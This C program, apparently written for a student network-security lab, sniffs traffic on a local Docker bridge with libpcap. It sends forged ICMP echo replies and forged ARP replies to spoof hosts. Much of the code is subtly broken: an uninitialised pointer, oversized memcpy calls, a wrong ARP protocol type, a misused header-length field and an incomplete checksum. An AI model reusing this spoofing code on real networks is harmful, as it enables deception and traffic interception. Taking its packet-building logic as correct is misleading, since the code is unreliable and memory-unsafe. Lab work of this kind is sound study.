#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <linux/tcp.h>
// #include <linux/if_arp.h>

#define IP4_HDRLEN 20
#define ICMP_HDRLEN 8 
/*
 * ARP header
 */

struct arp_header
{
    unsigned short int hw_type;                /* Format of hardware address.  */
    unsigned short int pro_type;                /* Format of protocol address.  */
    unsigned char hw_size;                /* Length of hardware address.  */
    unsigned char proto_size;                /* Length of protocol address.  */
    unsigned short int op;                /* ARP opcode (command).  */
    unsigned char sender_mac_add[ETH_ALEN];        /* Sender hardware address.  */
    unsigned char sender_ip_add[4];                /* Sender IP address.  */
    unsigned char target_mac_add[ETH_ALEN];        /* Target hardware address.  */
    unsigned char target_ip_add[4];                /* Target IP address.  */
};
  
/*--------------------------------------------------------------------------------
            ************ Compute checksum (RFC 1071): ***************
--------------------------------------------------------------------------------*/
unsigned short calculate_checksum(unsigned short * paddress, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short * w = paddress;
	unsigned short answer = 0;

	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1)
	{
		*((unsigned char *)&answer) = *((unsigned char *)w);
		sum += answer;
	}

	// add back carry outs from top 16 bits to low 16 bits
	sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
	sum += (sum >> 16);                 // add carry
	answer = ~sum;                      // truncate to 16 bits

	return answer;
}

/* 
This function will be invoked by pcap for each captured packet.
We can process each packet inside the function.
*/
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
        struct ethhdr *eth = (struct ethhdr *)packet;
        if (eth->h_proto != ntohs(0x0800)){ //0x0800 = ipv4
                struct arp_header* arp = (struct arp_header*) (packet + ETH_HLEN);
                struct arp_header* newarp;
                newarp->hw_type = htons(1);
                newarp->pro_type = htons(0x0806);
                newarp->hw_size = 6;
                newarp->proto_size = 4;
                newarp->op = htons(2);

                memcpy(newarp->sender_mac_add, &arp->target_mac_add, 6);
                memcpy(newarp->sender_ip_add, &arp->target_ip_add, 4*sizeof(uint32_t));
                memcpy(newarp->target_mac_add, &arp->sender_mac_add, 6);
                memcpy(newarp->target_ip_add, &arp->sender_ip_add, 4*sizeof(uint32_t));
                
                /*--------------------------------------------------------------------------------
                        ************ send: ***************
                --------------------------------------------------------------------------------*/
                // Combine the packet 
                char packet[44];
                // First, IP header.
                memcpy (packet, newarp, 44);
                for(int i=0;i<44; i++)
                        printf("%d", packet[i]);
                
                struct sockaddr_in dest_info;
                int enable = 1;
                inet_pton(AF_INET, "10.9.0.5", &(dest_info.sin_addr));
                // dest_info.sin_addr.s_addr = arp->sender_ip_add;
                
                //creat a raw network socket and set its options
                int sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
                if(sock == -1){
                        printf ("socket() failed with error");
                        printf ("To create a raw socket, the process needs to be run by Admin/root user.\n\n");
                }
                //send the packet out
                sendto(sock, newarp, 44, 0, (struct sockaddr*)&dest_info, sizeof(dest_info));
                close(sock);
        }
        else{
                struct ip* ip = (struct ip*)(packet + ETH_HLEN);
                struct icmp* icmp = (struct icmp*) (packet + ETH_HLEN + IP4_HDRLEN);

                if (icmp->icmp_type == 8){
                
                        printf("**************************\n");
                        printf("New ICMP packet sniffed:\n");
                        printf("\tSource: %s\n", inet_ntoa(ip->ip_src));
                        printf("\tDestination: %s\n", inet_ntoa(ip->ip_dst));
                        printf("\tType: %d\n", icmp->icmp_type);

                        /*--------------------------------------------------------------------------------
                                ************ Spoof IP: ***************
                        --------------------------------------------------------------------------------*/

                        const char buffer[1500];

                        //making a copy
                        memset((char*)buffer, 0, 1500);
                        memcpy((char*)buffer, ip, ntohs(ip->ip_hl));
                        struct ip* newip = (struct ip*) buffer;
                        struct icmp* newicmp = (struct icmp*) (buffer + IP4_HDRLEN);

                        newicmp->icmp_type = 0;
                        newicmp->icmp_code = 0;
                        newicmp->icmp_cksum = 0;
                        newicmp->icmp_cksum = calculate_checksum((unsigned short *)newicmp, ICMP_HDRLEN);

                        //filling in ip
                        newip->ip_src = ip->ip_dst;
                        newip->ip_dst = ip->ip_src;
                        newip->ip_ttl = 100;
                        newip->ip_len = ip->ip_len;

                        /*--------------------------------------------------------------------------------
                                ************ send: ***************
                        --------------------------------------------------------------------------------*/
                        printf("Sending spoofed ICMP reply:\n");
                        printf("\tSource: %s\n", inet_ntoa(newip->ip_src));
                        printf("\tDestination: %s\n", inet_ntoa(newip->ip_dst));

                        struct sockaddr_in dest_info;
                        int enable = 1;
                        
                        //creat a raw network socket and set its options
                        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
                        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
                        
                        //provide information about destination
                        dest_info.sin_family = AF_INET;
                        dest_info.sin_addr = newip->ip_dst;

                        //send the packet out
                        sendto(sock, newip, ntohs(newip->ip_len), 0, (struct sockaddr*)&dest_info, sizeof(dest_info));
                        close(sock);

                }
        
        }
}

int main()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *filter_exp = "ip proto icmp or arp";
    bpf_u_int32 net;
    // Step 1: Open live pcap session on NIC with name eth3
    handle = pcap_open_live("br-a7b19a894212", BUFSIZ, 1, 1000, errbuf);
    // Step 2: Compile filter_exp into BPF psuedo-code
    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);
    // Step 3: Capture packets
    printf("Sniffing packet....\n");
    pcap_loop(handle, -1, got_packet, NULL);
    
    pcap_close(handle); //Close the handle
    return 0;
}
// Note: don’t forget to add "-lpcap" to the compilation command.
// For example: gcc -o sniff sniff.c -lpcap
//0186 640200000010909926610905109050000001090990005378-19
//000108000604000102420a0900050a0900050000000000000a090063